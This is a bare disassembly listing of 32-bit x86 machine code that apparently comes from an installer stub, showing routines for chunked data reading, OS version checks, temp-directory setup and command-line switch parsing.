  4032d6:	be f8 38 41 00       	mov    $0x4138f8,%esi
  4032db:	81 7d 08 00 40 00 00 	cmpl   $0x4000,0x8(%ebp)
  4032e2:	8b 45 08             	mov    0x8(%ebp),%eax
  4032e5:	7c 05                	jl     0x4032ec
  4032e7:	b8 00 40 00 00       	mov    $0x4000,%eax
  4032ec:	50                   	push   %eax
  4032ed:	56                   	push   %esi
  4032ee:	ff 35 1c a0 40 00    	push   0x40a01c
  4032f4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4032f7:	e8 14 2d 00 00       	call   0x406010
  4032fc:	85 c0                	test   %eax,%eax
  4032fe:	74 4e                	je     0x40334e
  403300:	ff 75 fc             	push   -0x4(%ebp)
  403303:	56                   	push   %esi
  403304:	ff 75 0c             	push   0xc(%ebp)
  403307:	e8 33 2d 00 00       	call   0x40603f
  40330c:	85 c0                	test   %eax,%eax
  40330e:	74 16                	je     0x403326
  403310:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403313:	29 45 08             	sub    %eax,0x8(%ebp)
  403316:	01 05 00 f9 41 00    	add    %eax,0x41f900
  40331c:	03 d8                	add    %eax,%ebx
  40331e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403322:	7f b7                	jg     0x4032db
  403324:	eb 36                	jmp    0x40335c
  403326:	6a fe                	push   $0xfffffffe
  403328:	eb 26                	jmp    0x403350
  40332a:	8b 45 08             	mov    0x8(%ebp),%eax
  40332d:	3b 45 14             	cmp    0x14(%ebp),%eax
  403330:	7c 03                	jl     0x403335
  403332:	8b 45 14             	mov    0x14(%ebp),%eax
  403335:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403338:	56                   	push   %esi
  403339:	51                   	push   %ecx
  40333a:	50                   	push   %eax
  40333b:	ff 75 10             	push   0x10(%ebp)
  40333e:	ff 35 1c a0 40 00    	push   0x40a01c
  403344:	ff 15 b8 80 40 00    	call   *0x4080b8
  40334a:	85 c0                	test   %eax,%eax
  40334c:	75 05                	jne    0x403353
  40334e:	6a fd                	push   $0xfffffffd
  403350:	58                   	pop    %eax
  403351:	eb 0b                	jmp    0x40335e
  403353:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  403356:	01 1d 00 f9 41 00    	add    %ebx,0x41f900
  40335c:	8b c3                	mov    %ebx,%eax
  40335e:	5e                   	pop    %esi
  40335f:	5b                   	pop    %ebx
  403360:	c9                   	leave
  403361:	c2 10 00             	ret    $0x10
  403364:	53                   	push   %ebx
  403365:	55                   	push   %ebp
  403366:	56                   	push   %esi
  403367:	8b 35 00 f9 41 00    	mov    0x41f900,%esi
  40336d:	2b 35 68 b8 40 00    	sub    0x40b868,%esi
  403373:	57                   	push   %edi
  403374:	03 74 24 14          	add    0x14(%esp),%esi
  403378:	ff 15 cc 80 40 00    	call   *0x4080cc
  40337e:	33 db                	xor    %ebx,%ebx
  403380:	05 f4 01 00 00       	add    $0x1f4,%eax
  403385:	3b f3                	cmp    %ebx,%esi
  403387:	a3 6c 43 42 00       	mov    %eax,0x42436c
  40338c:	0f 8e 2a 01 00 00    	jle    0x4034bc
  403392:	ff 35 10 f9 41 00    	push   0x41f910
  403398:	e8 46 01 00 00       	call   0x4034e3
  40339d:	53                   	push   %ebx
  40339e:	53                   	push   %ebx
  40339f:	ff 35 68 b8 40 00    	push   0x40b868
  4033a5:	ff 35 1c a0 40 00    	push   0x40a01c
  4033ab:	ff 15 28 81 40 00    	call   *0x408128
  4033b1:	89 35 0c f9 41 00    	mov    %esi,0x41f90c
  4033b7:	89 1d f8 78 41 00    	mov    %ebx,0x4178f8
  4033bd:	bd f8 b8 40 00       	mov    $0x40b8f8,%ebp
  4033c2:	a1 04 f9 41 00       	mov    0x41f904,%eax
  4033c7:	bf 00 40 00 00       	mov    $0x4000,%edi
  4033cc:	2b 05 10 f9 41 00    	sub    0x41f910,%eax
  4033d2:	3b c7                	cmp    %edi,%eax
  4033d4:	7f 02                	jg     0x4033d8
  4033d6:	8b f8                	mov    %eax,%edi
  4033d8:	be f8 38 41 00       	mov    $0x4138f8,%esi
  4033dd:	57                   	push   %edi
  4033de:	56                   	push   %esi
  4033df:	e8 e9 00 00 00       	call   0x4034cd
  4033e4:	85 c0                	test   %eax,%eax
  4033e6:	0f 84 c2 00 00 00    	je     0x4034ae
  4033ec:	01 3d 10 f9 41 00    	add    %edi,0x41f910
  4033f2:	89 35 88 b8 40 00    	mov    %esi,0x40b888
  4033f8:	89 3d 8c b8 40 00    	mov    %edi,0x40b88c
  4033fe:	39 1d 70 43 42 00    	cmp    %ebx,0x424370
  403404:	74 29                	je     0x40342f
  403406:	39 1d 00 44 42 00    	cmp    %ebx,0x424400
  40340c:	75 21                	jne    0x40342f
  40340e:	a1 0c f9 41 00       	mov    0x41f90c,%eax
  403413:	53                   	push   %ebx
  403414:	2b 05 00 f9 41 00    	sub    0x41f900,%eax
  40341a:	2b 44 24 18          	sub    0x18(%esp),%eax
  40341e:	03 05 68 b8 40 00    	add    0x40b868,%eax
  403424:	a3 f8 78 41 00       	mov    %eax,0x4178f8
  403429:	e8 bb fa ff ff       	call   0x402ee9
  40342e:	59                   	pop    %ecx
  40342f:	b9 70 b8 40 00       	mov    $0x40b870,%ecx
  403434:	89 2d 90 b8 40 00    	mov    %ebp,0x40b890
  40343a:	c7 05 94 b8 40 00 00 	movl   $0x8000,0x40b894
  403441:	80 00 00 
  403444:	e8 29 35 00 00       	call   0x406972
  403449:	85 c0                	test   %eax,%eax
  40344b:	7c 6a                	jl     0x4034b7
  40344d:	8b 35 90 b8 40 00    	mov    0x40b890,%esi
  403453:	2b f5                	sub    %ebp,%esi
  403455:	74 21                	je     0x403478
  403457:	56                   	push   %esi
  403458:	55                   	push   %ebp
  403459:	ff 35 1c a0 40 00    	push   0x40a01c
  40345f:	e8 db 2b 00 00       	call   0x40603f
  403464:	85 c0                	test   %eax,%eax
  403466:	74 4b                	je     0x4034b3
  403468:	01 35 68 b8 40 00    	add    %esi,0x40b868
  40346e:	39 1d 8c b8 40 00    	cmp    %ebx,0x40b88c
  403474:	75 88                	jne    0x4033fe
  403476:	eb 0c                	jmp    0x403484
  403478:	39 1d 8c b8 40 00    	cmp    %ebx,0x40b88c
  40347e:	75 37                	jne    0x4034b7
  403480:	3b fb                	cmp    %ebx,%edi
  403482:	74 33                	je     0x4034b7
  403484:	a1 00 f9 41 00       	mov    0x41f900,%eax
  403489:	8b c8                	mov    %eax,%ecx
  40348b:	2b 0d 68 b8 40 00    	sub    0x40b868,%ecx
  403491:	03 4c 24 14          	add    0x14(%esp),%ecx
  403495:	85 c9                	test   %ecx,%ecx
  403497:	0f 8f 25 ff ff ff    	jg     0x4033c2
  40349d:	53                   	push   %ebx
  40349e:	53                   	push   %ebx
  40349f:	50                   	push   %eax
  4034a0:	ff 35 1c a0 40 00    	push   0x40a01c
  4034a6:	ff 15 28 81 40 00    	call   *0x408128
  4034ac:	eb 0e                	jmp    0x4034bc
  4034ae:	83 c8 ff             	or     $0xffffffff,%eax
  4034b1:	eb 13                	jmp    0x4034c6
  4034b3:	6a fe                	push   $0xfffffffe
  4034b5:	eb 02                	jmp    0x4034b9
  4034b7:	6a fd                	push   $0xfffffffd
  4034b9:	58                   	pop    %eax
  4034ba:	eb 0a                	jmp    0x4034c6
  4034bc:	6a 01                	push   $0x1
  4034be:	e8 26 fa ff ff       	call   0x402ee9
  4034c3:	59                   	pop    %ecx
  4034c4:	33 c0                	xor    %eax,%eax
  4034c6:	5f                   	pop    %edi
  4034c7:	5e                   	pop    %esi
  4034c8:	5d                   	pop    %ebp
  4034c9:	5b                   	pop    %ebx
  4034ca:	c2 04 00             	ret    $0x4
  4034cd:	ff 74 24 08          	push   0x8(%esp)
  4034d1:	ff 74 24 08          	push   0x8(%esp)
  4034d5:	ff 35 18 a0 40 00    	push   0x40a018
  4034db:	e8 30 2b 00 00       	call   0x406010
  4034e0:	c2 08 00             	ret    $0x8
  4034e3:	6a 00                	push   $0x0
  4034e5:	6a 00                	push   $0x0
  4034e7:	ff 74 24 0c          	push   0xc(%esp)
  4034eb:	ff 35 18 a0 40 00    	push   0x40a018
  4034f1:	ff 15 28 81 40 00    	call   *0x408128
  4034f7:	c2 04 00             	ret    $0x4
  4034fa:	56                   	push   %esi
  4034fb:	be 00 b4 42 00       	mov    $0x42b400,%esi
  403500:	56                   	push   %esi
  403501:	e8 f9 31 00 00       	call   0x4066ff
  403506:	56                   	push   %esi
  403507:	e8 f8 28 00 00       	call   0x405e04
  40350c:	85 c0                	test   %eax,%eax
  40350e:	75 02                	jne    0x403512
  403510:	5e                   	pop    %esi
  403511:	c3                   	ret
  403512:	56                   	push   %esi
  403513:	e8 7f 28 00 00       	call   0x405d97
  403518:	56                   	push   %esi
  403519:	e8 4b 25 00 00       	call   0x405a69
  40351e:	56                   	push   %esi
  40351f:	68 00 b0 42 00       	push   $0x42b000
  403524:	e8 9e 2a 00 00       	call   0x405fc7
  403529:	5e                   	pop    %esi
  40352a:	c3                   	ret
  40352b:	55                   	push   %ebp
  40352c:	8b ec                	mov    %esp,%ebp
  40352e:	81 ec 24 02 00 00    	sub    $0x224,%esp
  403534:	56                   	push   %esi
  403535:	57                   	push   %edi
  403536:	33 ff                	xor    %edi,%edi
  403538:	68 01 80 00 00       	push   $0x8001
  40353d:	89 7d ec             	mov    %edi,-0x14(%ebp)
  403540:	c7 45 f4 30 a1 40 00 	movl   $0x40a130,-0xc(%ebp)
  403547:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40354a:	c6 45 fc 20          	movb   $0x20,-0x4(%ebp)
  40354e:	ff 15 90 80 40 00    	call   *0x408090
  403554:	8b 35 94 80 40 00    	mov    0x408094,%esi
  40355a:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  403560:	50                   	push   %eax
  403561:	89 bd 50 ff ff ff    	mov    %edi,-0xb0(%ebp)
  403567:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40356a:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  40356d:	c7 85 3c ff ff ff 9c 	movl   $0x9c,-0xc4(%ebp)
  403574:	00 00 00 
  403577:	ff d6                	call   *%esi
  403579:	85 c0                	test   %eax,%eax
  40357b:	75 3f                	jne    0x4035bc
  40357d:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  403583:	c7 85 3c ff ff ff 94 	movl   $0x94,-0xc4(%ebp)
  40358a:	00 00 00 
  40358d:	50                   	push   %eax
  40358e:	ff d6                	call   *%esi
  403590:	83 bd 4c ff ff ff 02 	cmpl   $0x2,-0xb4(%ebp)
  403597:	75 2a                	jne    0x4035c3
  403599:	66 0f be 8d 5d ff ff 	movsbw -0xa3(%ebp),%cx
  4035a0:	ff 
  4035a1:	8a 85 50 ff ff ff    	mov    -0xb0(%ebp),%al
  4035a7:	83 e9 30             	sub    $0x30,%ecx
  4035aa:	2c 53                	sub    $0x53,%al
  4035ac:	c6 45 d6 04          	movb   $0x4,-0x2a(%ebp)
  4035b0:	f6 d8                	neg    %al
  4035b2:	1b c0                	sbb    %eax,%eax
  4035b4:	f7 d0                	not    %eax
  4035b6:	23 c1                	and    %ecx,%eax
  4035b8:	66 89 45 d0          	mov    %ax,-0x30(%ebp)
  4035bc:	83 bd 4c ff ff ff 02 	cmpl   $0x2,-0xb4(%ebp)
  4035c3:	73 22                	jae    0x4035e7
  4035c5:	80 65 d6 00          	andb   $0x0,-0x2a(%ebp)
  4035c9:	80 bd 51 ff ff ff 41 	cmpb   $0x41,-0xaf(%ebp)
  4035d0:	7c 11                	jl     0x4035e3
  4035d2:	66 0f be 85 51 ff ff 	movsbw -0xaf(%ebp),%ax
  4035d9:	ff 
  4035da:	83 e8 40             	sub    $0x40,%eax
  4035dd:	66 89 45 d0          	mov    %ax,-0x30(%ebp)
  4035e1:	eb 04                	jmp    0x4035e7
  4035e3:	66 89 7d d0          	mov    %di,-0x30(%ebp)
  4035e7:	83 bd 40 ff ff ff 0a 	cmpl   $0xa,-0xc0(%ebp)
  4035ee:	73 08                	jae    0x4035f8
  4035f0:	66 83 a5 4a ff ff ff 	andw   $0x0,-0xb6(%ebp)
  4035f7:	00 
  4035f8:	8b 85 48 ff ff ff    	mov    -0xb8(%ebp),%eax
  4035fe:	0f b6 8d 44 ff ff ff 	movzbl -0xbc(%ebp),%ecx
  403605:	a3 18 44 42 00       	mov    %eax,0x424418
  40360a:	33 c0                	xor    %eax,%eax
  40360c:	8a a5 40 ff ff ff    	mov    -0xc0(%ebp),%ah
  403612:	0f b7 c0             	movzwl %ax,%eax
  403615:	0b c1                	or     %ecx,%eax
  403617:	33 c9                	xor    %ecx,%ecx
  403619:	8a 6d d0             	mov    -0x30(%ebp),%ch
  40361c:	0f b7 c9             	movzwl %cx,%ecx
  40361f:	c1 e0 10             	shl    $0x10,%eax
  403622:	0b c1                	or     %ecx,%eax
  403624:	0f b6 4d d6          	movzbl -0x2a(%ebp),%ecx
  403628:	0b c1                	or     %ecx,%eax
  40362a:	a3 1c 44 42 00       	mov    %eax,0x42441c
  40362f:	66 81 3d 1e 44 42 00 	cmpw   $0x600,0x42441e
  403636:	00 06 
  403638:	74 11                	je     0x40364b
  40363a:	57                   	push   %edi
  40363b:	e8 ed 31 00 00       	call   0x40682d
  403640:	3b c7                	cmp    %edi,%eax
  403642:	74 07                	je     0x40364b
  403644:	68 00 0c 00 00       	push   $0xc00
  403649:	ff d0                	call   *%eax
  40364b:	be 98 82 40 00       	mov    $0x408298,%esi
  403650:	56                   	push   %esi
  403651:	e8 69 31 00 00       	call   0x4067bf
  403656:	56                   	push   %esi
  403657:	ff 15 98 80 40 00    	call   *0x408098
  40365d:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403661:	80 3e 00             	cmpb   $0x0,(%esi)
  403664:	75 ea                	jne    0x403650
  403666:	6a 0c                	push   $0xc
  403668:	e8 c0 31 00 00       	call   0x40682d
  40366d:	6a 0a                	push   $0xa
  40366f:	e8 b9 31 00 00       	call   0x40682d
  403674:	6a 08                	push   $0x8
  403676:	a3 64 43 42 00       	mov    %eax,0x424364
  40367b:	e8 ad 31 00 00       	call   0x40682d
  403680:	3b c7                	cmp    %edi,%eax
  403682:	74 0f                	je     0x403693
  403684:	6a 1e                	push   $0x1e
  403686:	ff d0                	call   *%eax
  403688:	85 c0                	test   %eax,%eax
  40368a:	74 07                	je     0x403693
  40368c:	80 0d 1c 44 42 00 80 	orb    $0x80,0x42441c
  403693:	53                   	push   %ebx
  403694:	ff 15 38 80 40 00    	call   *0x408038
  40369a:	57                   	push   %edi
  40369b:	ff 15 80 82 40 00    	call   *0x408280
  4036a1:	a3 20 44 42 00       	mov    %eax,0x424420
  4036a6:	57                   	push   %edi
  4036a7:	8d 85 dc fd ff ff    	lea    -0x224(%ebp),%eax
  4036ad:	68 60 01 00 00       	push   $0x160
  4036b2:	50                   	push   %eax
  4036b3:	57                   	push   %edi
  4036b4:	68 14 f9 41 00       	push   $0x41f914
  4036b9:	ff 15 70 81 40 00    	call   *0x408170
  4036bf:	68 e0 a1 40 00       	push   $0x40a1e0
  4036c4:	68 60 3b 42 00       	push   $0x423b60
  4036c9:	e8 37 2d 00 00       	call   0x406405
  4036ce:	ff 15 9c 80 40 00    	call   *0x40809c
  4036d4:	bb 00 a0 42 00       	mov    $0x42a000,%ebx
  4036d9:	50                   	push   %eax
  4036da:	53                   	push   %ebx
  4036db:	e8 25 2d 00 00       	call   0x406405
  4036e0:	80 3d 00 a0 42 00 22 	cmpb   $0x22,0x42a000
  4036e7:	c7 05 60 43 42 00 00 	movl   $0x400000,0x424360
  4036ee:	00 40 00 
  4036f1:	8b c3                	mov    %ebx,%eax
  4036f3:	75 09                	jne    0x4036fe
  4036f5:	c6 45 fc 22          	movb   $0x22,-0x4(%ebp)
  4036f9:	b8 01 a0 42 00       	mov    $0x42a001,%eax
  4036fe:	ff 75 fc             	push   -0x4(%ebp)
  403701:	50                   	push   %eax
  403702:	e8 bb 26 00 00       	call   0x405dc2
  403707:	50                   	push   %eax
  403708:	ff 15 f4 81 40 00    	call   *0x4081f4
  40370e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403711:	e9 bc 00 00 00       	jmp    0x4037d2
  403716:	80 f9 20             	cmp    $0x20,%cl
  403719:	75 06                	jne    0x403721
  40371b:	40                   	inc    %eax
  40371c:	80 38 20             	cmpb   $0x20,(%eax)
  40371f:	74 fa                	je     0x40371b
  403721:	80 38 22             	cmpb   $0x22,(%eax)
  403724:	c6 45 fc 20          	movb   $0x20,-0x4(%ebp)
  403728:	75 05                	jne    0x40372f
  40372a:	40                   	inc    %eax
  40372b:	c6 45 fc 22          	movb   $0x22,-0x4(%ebp)
  40372f:	80 38 2f             	cmpb   $0x2f,(%eax)
  403732:	0f 85 8b 00 00 00    	jne    0x4037c3
  403738:	40                   	inc    %eax
  403739:	80 38 53             	cmpb   $0x53,(%eax)
  40373c:	75 16                	jne    0x403754
  40373e:	8a 48 01             	mov    0x1(%eax),%cl
  403741:	80 f9 20             	cmp    $0x20,%cl
  403744:	74 04                	je     0x40374a
  403746:	84 c9                	test   %cl,%cl
  403748:	75 0a                	jne    0x403754
  40374a:	c7 05 00 44 42 00 01 	movl   $0x1,0x424400
  403751:	00 00 00 
  403754:	0f be 0d db a1 40 00 	movsbl 0x40a1db,%ecx
  40375b:	0f be 15 da a1 40 00 	movsbl 0x40a1da,%edx
  403762:	c1 e1 08             	shl    $0x8,%ecx
  403765:	0b ca                	or     %edx,%ecx
  403767:	0f be 15 d9 a1 40 00 	movsbl 0x40a1d9,%edx
  40376e:	c1 e1 08             	shl    $0x8,%ecx
  403771:	0b ca                	or     %edx,%ecx
  403773:	0f be 15 d8 a1 40 00 	movsbl 0x40a1d8,%edx
  40377a:	c1 e1 08             	shl    $0x8,%ecx
  40377d:	0b ca                	or     %edx,%ecx
  40377f:	39 08                	cmp    %ecx,(%eax)
  403781:	75 10                	jne    0x403793
  403783:	8a 48 04             	mov    0x4(%eax),%cl
  403786:	80 f9 20             	cmp    $0x20,%cl
  403789:	74 04                	je     0x40378f
  40378b:	84 c9                	test   %cl,%cl
  40378d:	75 04                	jne    0x403793
  40378f:	83 4d f8 04          	orl    $0x4,-0x8(%ebp)
  403793:	0f be 0d d3 a1 40 00 	movsbl 0x40a1d3,%ecx
  40379a:	0f be 15 d2 a1 40 00 	movsbl 0x40a1d2,%edx
  4037a1:	c1 e1 08             	shl    $0x8,%ecx
  4037a4:	0b ca                	or     %edx,%ecx
  4037a6:	0f be 15 d1 a1 40 00 	movsbl 0x40a1d1,%edx
  4037ad:	c1 e1 08             	shl    $0x8,%ecx
  4037b0:	0b ca                	or     %edx,%ecx
  4037b2:	0f be 15 d0 a1 40 00 	movsbl 0x40a1d0,%edx
  4037b9:	c1 e1 08             	shl    $0x8,%ecx
  4037bc:	0b ca                	or     %edx,%ecx
  4037be:	39 48 fe             	cmp    %ecx,-0x2(%eax)
  4037c1:	74 1b                	je     0x4037de
  4037c3:	ff 75 fc             	push   -0x4(%ebp)
  4037c6:	50                   	push   %eax
  4037c7:	e8 f6 25 00 00       	call   0x405dc2
  4037cc:	80 38 22             	cmpb   $0x22,(%eax)
  4037cf:	75 01                	jne    0x4037d2
  4037d1:	40                   	inc    %eax
  4037d2:	8a 08                	mov    (%eax),%cl
  4037d4:	84 c9                	test   %cl,%cl
  4037d6:	0f 85 3a ff ff ff    	jne    0x403716
  4037dc:	eb 12                	jmp    0x4037f0
  4037de:	80 60 fe 00          	andb   $0x0,-0x2(%eax)
  4037e2:	83 c0 02             	add    $0x2,%eax
  4037e5:	50                   	push   %eax
  4037e6:	68 00 a4 42 00       	push   $0x42a400
  4037eb:	e8 15 2c 00 00       	call   0x406405
  4037f0:	8b 3d a0 80 40 00    	mov    0x4080a0,%edi
  4037f6:	be 00 b4 42 00       	mov    $0x42b400,%esi
  4037fb:	56                   	push   %esi
  4037fc:	68 00 04 00 00       	push   $0x400
  403801:	ff d7                	call   *%edi
  403803:	e8 f2 fc ff ff       	call   0x4034fa
  403808:	85 c0                	test   %eax,%eax
  40380a:	75 63                	jne    0x40386f
  40380c:	68 fb 03 00 00       	push   $0x3fb
  403811:	56                   	push   %esi
  403812:	ff 15 a4 80 40 00    	call   *0x4080a4
  403818:	68 c8 a1 40 00       	push   $0x40a1c8
  40381d:	56                   	push   %esi
  40381e:	e8 fe 2b 00 00       	call   0x406421
  403823:	e8 d2 fc ff ff       	call   0x4034fa
  403828:	85 c0                	test   %eax,%eax
  40382a:	75 43                	jne    0x40386f
  40382c:	e8 55 22 00 00       	call   0x405a86
  403831:	85 c0                	test   %eax,%eax
  403833:	0f 85 e1 00 00 00    	jne    0x40391a
  403839:	56                   	push   %esi
  40383a:	68 fc 03 00 00       	push   $0x3fc
  40383f:	ff d7                	call   *%edi
  403841:	68 c4 a1 40 00       	push   $0x40a1c4
  403846:	56                   	push   %esi
  403847:	e8 d5 2b 00 00       	call   0x406421
  40384c:	8b 3d a8 80 40 00    	mov    0x4080a8,%edi
  403852:	56                   	push   %esi
  403853:	68 bc a1 40 00       	push   $0x40a1bc
  403858:	ff d7                	call   *%edi
  40385a:	56                   	push   %esi
  40385b:	68 b8 a1 40 00       	push   $0x40a1b8
  403860:	ff d7                	call   *%edi
  403862:	e8 93 fc ff ff       	call   0x4034fa
  403867:	85 c0                	test   %eax,%eax
  403869:	0f 84 ab 00 00 00    	je     0x40391a
  40386f:	68 00 b0 42 00       	push   $0x42b000
  403874:	ff 15 38 81 40 00    	call   *0x408138
  40387a:	ff 75 f8             	push   -0x8(%ebp)
  40387d:	e8 06 f7 ff ff       	call   0x402f88
  403882:	85 c0                	test   %eax,%eax
  403884:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403887:	0f 85 8d 00 00 00    	jne    0x40391a
  40388d:	39 05 7c 43 42 00    	cmp    %eax,0x42437c
  403893:	74 76                	je     0x40390b
  403895:	50                   	push   %eax
  403896:	53                   	push   %ebx
  403897:	e8 26 25 00 00       	call   0x405dc2
  40389c:	8b f8                	mov    %eax,%edi
  40389e:	3b fb                	cmp    %ebx,%edi
  4038a0:	72 34                	jb     0x4038d6
  4038a2:	0f be 05 b3 a1 40 00 	movsbl 0x40a1b3,%eax
  4038a9:	0f be 0d b2 a1 40 00 	movsbl 0x40a1b2,%ecx
  4038b0:	c1 e0 08             	shl    $0x8,%eax
  4038b3:	0b c1                	or     %ecx,%eax
  4038b5:	0f be 0d b1 a1 40 00 	movsbl 0x40a1b1,%ecx
  4038bc:	c1 e0 08             	shl    $0x8,%eax
  4038bf:	0b c1                	or     %ecx,%eax
  4038c1:	0f be 0d b0 a1 40 00 	movsbl 0x40a1b0,%ecx
  4038c8:	c1 e0 08             	shl    $0x8,%eax
  4038cb:	0b c1                	or     %ecx,%eax
  4038cd:	39 07                	cmp    %eax,(%edi)
  4038cf:	74 05                	je     0x4038d6
  4038d1:	4f                   	dec    %edi
  4038d2:	3b fb                	cmp    %ebx,%edi
  4038d4:	73 f7                	jae    0x4038cd
  4038d6:	3b fb                	cmp    %ebx,%edi
  4038d8:	c7 45 f4 74 a1 40 00 	movl   $0x40a174,-0xc(%ebp)
  4038df:	72 65                	jb     0x403946
  4038e1:	80 27 00             	andb   $0x0,(%edi)
  4038e4:	83 c7 04             	add    $0x4,%edi
  4038e7:	57                   	push   %edi
  4038e8:	e8 98 25 00 00       	call   0x405e85
  4038ed:	85 c0                	test   %eax,%eax
  4038ef:	74 29                	je     0x40391a
  4038f1:	57                   	push   %edi
  4038f2:	68 00 a4 42 00       	push   $0x42a400
  4038f7:	e8 09 2b 00 00       	call   0x406405
  4038fc:	57                   	push   %edi
  4038fd:	68 00 a8 42 00       	push   $0x42a800
  403902:	e8 fe 2a 00 00       	call   0x406405
  403907:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  40390b:	83 0d 0c 44 42 00 ff 	orl    $0xffffffff,0x42440c
  403912:	e8 f7 02 00 00       	call   0x403c0e
  403917:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40391a:	e8 fd 01 00 00       	call   0x403b1c
  40391f:	ff 15 7c 82 40 00    	call   *0x40827c
  403925:	33 ff                	xor    %edi,%edi
  403927:	5b                   	pop    %ebx
  403928:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  40392b:	0f 84 57 01 00 00    	je     0x403a88
  403931:	68 10 00 20 00       	push   $0x200010
  403936:	ff 75 f4             	push   -0xc(%ebp)
  403939:	e8 dd 21 00 00       	call   0x405b1b
  40393e:	6a 02                	push   $0x2
  403940:	ff 15 ac 80 40 00    	call   *0x4080ac
  403946:	e8 3b 21 00 00       	call   0x405a86
  40394b:	56                   	push   %esi
  40394c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40394f:	e8 c7 2a 00 00       	call   0x40641b
  403954:	ff 75 f0             	push   -0x10(%ebp)
  403957:	8b f8                	mov    %eax,%edi
  403959:	68 00 50 42 00       	push   $0x425000
  40395e:	e8 a2 2a 00 00       	call   0x406405
  403963:	80 3d 00 a4 42 00 00 	cmpb   $0x0,0x42a400
  40396a:	75 0f                	jne    0x40397b
  40396c:	68 00 ac 42 00       	push   $0x42ac00
  403971:	68 00 a4 42 00       	push   $0x42a400
  403976:	e8 8a 2a 00 00       	call   0x406405
  40397b:	8d 87 00 b4 42 00    	lea    0x42b400(%edi),%eax
  403981:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  403988:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40398b:	bf 00 64 42 00       	mov    $0x426400,%edi
  403990:	bb 00 68 42 00       	mov    $0x426800,%ebx
  403995:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403999:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  40399d:	50                   	push   %eax
  40399e:	68 a4 a1 40 00       	push   $0x40a1a4
  4039a3:	ff 75 f0             	push   -0x10(%ebp)
  4039a6:	ff 15 18 82 40 00    	call   *0x408218
  4039ac:	a1 70 43 42 00       	mov    0x424370,%eax
  4039b1:	83 c4 0c             	add    $0xc,%esp
  4039b4:	ff b0 20 01 00 00    	push   0x120(%eax)
  4039ba:	57                   	push   %edi
  4039bb:	e8 d8 2a 00 00       	call   0x406498
  4039c0:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4039c4:	56                   	push   %esi
  4039c5:	74 07                	je     0x4039ce
  4039c7:	e8 43 20 00 00       	call   0x405a0f
  4039cc:	eb 05                	jmp    0x4039d3
  4039ce:	e8 96 20 00 00       	call   0x405a69
  4039d3:	85 c0                	test   %eax,%eax
  4039d5:	74 38                	je     0x403a0f
  4039d7:	57                   	push   %edi
  4039d8:	ff 15 d8 80 40 00    	call   *0x4080d8
  4039de:	f6 c4 04             	test   $0x4,%ah
  4039e1:	75 1d                	jne    0x403a00
  4039e3:	57                   	push   %edi
  4039e4:	ff 15 38 81 40 00    	call   *0x408138
  4039ea:	85 c0                	test   %eax,%eax
  4039ec:	74 12                	je     0x403a00
  4039ee:	6a 01                	push   $0x1
  4039f0:	56                   	push   %esi
  4039f1:	e8 d1 21 00 00       	call   0x405bc7
  4039f6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4039f9:	ff 45 fc             	incl   -0x4(%ebp)
  4039fc:	85 c0                	test   %eax,%eax
  4039fe:	74 99                	je     0x403999
  403a00:	ff 45 f8             	incl   -0x8(%ebp)
  403a03:	66 83 7d f8 00       	cmpw   $0x0,-0x8(%ebp)
  403a08:	75 8b                	jne    0x403995
  403a0a:	e9 0b ff ff ff       	jmp    0x40391a
  403a0f:	56                   	push   %esi
  403a10:	ff 15 dc 80 40 00    	call   *0x4080dc
  403a16:	6a 00                	push   $0x0
  403a18:	56                   	push   %esi
  403a19:	e8 c0 27 00 00       	call   0x4061de
  403a1e:	6a 01                	push   $0x1
  403a20:	57                   	push   %edi
  403a21:	68 00 bc 42 00       	push   $0x42bc00
  403a26:	ff 15 b0 80 40 00    	call   *0x4080b0
  403a2c:	85 c0                	test   %eax,%eax
  403a2e:	0f 84 e6 fe ff ff    	je     0x40391a
  403a34:	6a 00                	push   $0x0
  403a36:	57                   	push   %edi
  403a37:	e8 a2 27 00 00       	call   0x4061de
  403a3c:	a1 70 43 42 00       	mov    0x424370,%eax
  403a41:	ff b0 24 01 00 00    	push   0x124(%eax)
  403a47:	53                   	push   %ebx
  403a48:	e8 4b 2a 00 00       	call   0x406498
  403a4d:	53                   	push   %ebx
  403a4e:	e8 4b 20 00 00       	call   0x405a9e
  403a53:	85 c0                	test   %eax,%eax
  403a55:	75 21                	jne    0x403a78
  403a57:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403a5a:	ff 45 fc             	incl   -0x4(%ebp)
  403a5d:	85 c0                	test   %eax,%eax
  403a5f:	0f 85 b5 fe ff ff    	jne    0x40391a
  403a65:	57                   	push   %edi
  403a66:	e8 2d 2d 00 00       	call   0x406798
  403a6b:	85 c0                	test   %eax,%eax
  403a6d:	0f 84 26 ff ff ff    	je     0x403999
  403a73:	e9 a2 fe ff ff       	jmp    0x40391a
  403a78:	50                   	push   %eax
  403a79:	ff 15 f8 80 40 00    	call   *0x4080f8
  403a7f:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  403a83:	e9 92 fe ff ff       	jmp    0x40391a
  403a88:	39 3d f4 43 42 00    	cmp    %edi,0x4243f4
  403a8e:	74 76                	je     0x403b06
  403a90:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403a93:	50                   	push   %eax
  403a94:	6a 28                	push   $0x28
  403a96:	ff 15 60 81 40 00    	call   *0x408160
  403a9c:	50                   	push   %eax
  403a9d:	ff 15 24 80 40 00    	call   *0x408024
  403aa3:	85 c0                	test   %eax,%eax
